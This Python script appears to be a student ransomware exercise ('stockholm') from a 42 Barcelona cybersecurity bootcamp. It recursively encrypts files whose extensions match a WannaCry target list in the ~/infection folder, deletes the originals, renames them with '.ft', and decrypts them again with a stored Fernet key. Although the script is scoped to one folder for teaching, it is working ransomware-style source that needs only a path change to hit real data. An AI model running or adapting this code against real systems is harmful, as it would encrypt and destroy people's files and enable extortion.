#!/usr/bin/python3
#!/Users/lcasado-/miniconda3/envs/42AI-stockholm/bin/python
#!/home/luis/anaconda3/envs/42AI-stockholm/bin/python

import os
import sys
from cryptography.fernet import Fernet
try:
    import argparse
except ModuleNotFoundError:
    print("Module argaprse is required.")

HOME = os.environ["HOME"]


def encrypt_content(content):

    try:
        # get the key i will use to seed cifer tool
        cifer_key_path = os.path.join(HOME, ".ssh/.encrypt.key")

        with open(cifer_key_path, 'rb') as f:
            cifer_key = f.read()    # it is a 44 length byte array

        # initialize encrypter wiht the key
        fernet = Fernet(cifer_key)
        
        # encrypt the content
        content_encrypted = fernet.encrypt(content)

        return content_encrypted

    except FileNotFoundError:
        msg = "Encription Key not found. Execute 'generate_encrypt_key.py'"
        print(msg)


def decrypt_content(content_encrypted):

    try:
        # read the key used to seed cifer tool
        cifer_key_path = os.path.join(HOME, ".ssh/.encrypt.key")
        with open(cifer_key_path, 'rb') as f:
            cifer_key = f.read()

        # initialize encrypter wiht the key
        fernet = Fernet(cifer_key)
        
        # decrypt TOTP Key
        content = fernet.decrypt(content_encrypted)

        return content

    except FileNotFoundError:
        msg = f"Not found {cifer_key_path}. "
        msg = msg + "Execute 'generate_encrypt_key.py"
        raise ValueError(msg)


def read_wannacry_extensions():
    """
    copied a file from 
    https://gist.github.com/xpn/facb5692980c14df272b16a4ee6a29d5
    
    this funcion reads from a file and adds into a set, 
    all file extensions affected by wanacry Ransommware.
    """
    try:
        filename = "wannacry_file_extensions.txt"
        pathfile = os.path.join(os.getcwd(), filename)
        ext = set()
        with open(pathfile, 'r') as f:
            for line in f:
                data = f.readline().strip()
                ext.add(data.lower())
        return sorted(ext)
    except FileNotFoundError:
        print(f"Not found file {filename} in cwd")

    
def recursive_encrypt(folderpath, silence):
    global counter
    for root, dirs, files in os.walk(folderpath, topdown=True,):   # By default does not follows simbolic links to subdirectories
        # first treat files in folders

        for file in files:
            file_name, file_ext = os.path.splitext(file)
            # does file have an extension affected by Wannacry
            if file_ext in extensions:
                # rename all with ".ft" but the files ending with ".ft"
                if file_ext == ".ft":
                    fileout = file
                else:
                    fileout = file + ".ft"
            

                with open(os.path.join(root, file), 'rb') as infile:
                    incontent = infile.read()
                    cipheredcontent = encrypt_content(incontent)
                    with open(os.path.join(root, fileout), 'wb') as outfile:
                        outfile.write(cipheredcontent)
                os.remove(os.path.join(root, file))
                #try:

                #if os.access(os.path.join(root, file), os.R_OK):
                if not silence:
                    print(root, file)
                counter = counter + 1
        # second, if there are subfolders, treat them
        if len(dirs)>0:
            for dir in dirs:
                recursive_encrypt(os.path.join(root,dir), silence)


def recursive_reverse(folderpath, silence):
    global counter
    for root, dirs, files in os.walk(folderpath, topdown=True,):   # By default does not follows simbolic links to subdirectories
        # first treat files in folders

        for file in files:
            file_name, file_ext = os.path.splitext(file)
            # does file have an extension affected by Wannacry
            if file_ext == ".ft":
                fileout = file_name
                with open(os.path.join(root, file), 'rb') as infile:
                    incontent = infile.read()
                    unciperedcontent = decrypt_content(incontent)
                    with open(os.path.join(root, fileout), 'wb') as outfile:
                        outfile.write(unciperedcontent)
                os.remove(os.path.join(root, file))
                #try:

                #if os.access(os.path.join(root, file), os.R_OK):
                if not silence:
                    print(root, file)
                counter = counter + 1
        # second, if there are subfolders, treat them
        if len(dirs)>0:
            for dir in dirs:
                recursive_reverse(os.path.join(root,dir), silence)


def correct_key(argument):
    """
        Checks if a key entered by user is the same that the one.
    PARAMS:
        Argument : Pathfile to cyphered secret key

    RETURNS
        'BADKEY' IF the argument DOES NOT fits encryption key else argument
    """
    if argument is None:
        parser.error(f"La clave para descifrar falta '{argument}'")
    else:
        try:

            cwd = os.getcwd()
            cifer_key_path = os.path.join(HOME, ".ssh/.encrypt.key")

            if os.path.isfile(cifer_key_path):
                if not os.access(cifer_key_path, os.R_OK):
                    parser.error(f"can not read'{cifer_key_path}'")
                else:
                    with open(cifer_key_path, 'rb') as f:
                        cifer_key = f.read()    # it is a 44 length byte array
                    if argument == cifer_key.decode():
                        return argument
                    else:
                        return 'BADKEY'

        except FileNotFoundError:
            msg = "Encription Key not found. Execute 'generate_encrypt_key.py'"
            print(msg)


def create_argument_parser():

    msg = f"""
    Pequeño programa de cifrado.
    Es un ejercicio del bootcamp de ciberseguridad de 42 Barcelona.
    Solamente afecta a los archivos de la carpeta '{HOME}/infection'
    """
    parser = argparse.ArgumentParser(
        prog='stockholm',
        description=msg,
        epilog='Este es el final de la ayuda',
        usage="""
        ./stockholm [-h] [-v] [-s] [-r] KEY
        """
        )

    parser.add_argument('-v','--version',
                       help=f'Muestra la versión del programa',
                       action='store_true')
    parser.add_argument('-s','--silent',
                       help='No mostrar nombres de ficheros cifrados',
                       action='store_true')
    parser.add_argument('-r','--reverse', metavar='KEY',
                       help=f'introduzca la clave para revertir el cifrado',
                       type=correct_key)



    return parser



if __name__ == "__main__":
    
    parser = create_argument_parser()
    args = parser.parse_args(sys.argv[1:])
    #args = parser.parse_args(['-r', 'U7m7sfudf96edFqZNzkrFw5qNce6YLJ7LYdTTsq2YM8='])
    print("Estos son mis argumentos ", args)
    
    silence = False

    counter = 0  # will count how many files were encrypted.
    
    # read a txt file wiht file extensions to encryp

    extensions = read_wannacry_extensions()
    #print(extensions)



    folderpath = os.path.join(HOME, "infection")

    if args.version: print("Stockholm Version 0.0.1")
    if args.silent: silence=True
    if args.reverse is None:
        print("voy a cifrar")
        recursive_encrypt(folderpath,silence)
    elif args.reverse == 'BADKEY':
        print("La clave para descifrar no coincide con la calve de cifrado")
    else:
        recursive_reverse(folderpath,silence)
        

    
    


            
    print(f"{counter} files treated")
